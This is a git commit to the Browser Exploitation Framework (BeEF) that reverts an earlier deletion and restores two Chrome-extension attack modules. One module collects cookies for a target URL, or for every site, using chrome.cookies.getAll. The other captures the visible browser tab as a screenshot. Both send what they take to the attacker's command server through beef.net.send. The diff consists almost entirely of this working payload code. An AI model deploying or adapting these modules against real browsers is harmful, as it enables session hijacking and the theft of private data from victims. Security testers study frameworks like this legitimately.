5a272ec932e7515f7d49bcfff0c1026d28f7ff9b
Pierre-Luc Brunet <fuitad@gmail.com>
2018-09-17 14:47:24 -0400

    Revert "Removed two Chrome module that no longer work. chrome.cookies and chrome.tabs no longer exists"
    This reverts commit cac75a521ed76c58fedb578756aec9d23b5e3005.

---
+++ modules/chrome_extensions/get_all_cookies/command.js
@@ -0,0 +1,20 @@
+//
+// Copyright (c) 2006-2018 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - http://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+beef.execute(function() {
+	the_url = "<%== @url %>";
+	if (the_url != 'default_all') {
+	    chrome.cookies.getAll({url:the_url}, function(cookies){
+	        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'cookies: ' + JSON.stringify(cookies));
+	    })
+	} else {
+		chrome.cookies.getAll({}, function(cookies){
+        	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'cookies: ' + JSON.stringify(cookies));
+    	})
+	}
+
+});
+
---
+++ modules/chrome_extensions/screenshot/command.js
@@ -0,0 +1,13 @@
+//
+// Copyright (c) 2006-2018 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - http://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+beef.execute(function() {
+
+    chrome.tabs.captureVisibleTab(null, function(img) {
+        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'img: ' + img.toString());
+    });
+});
+
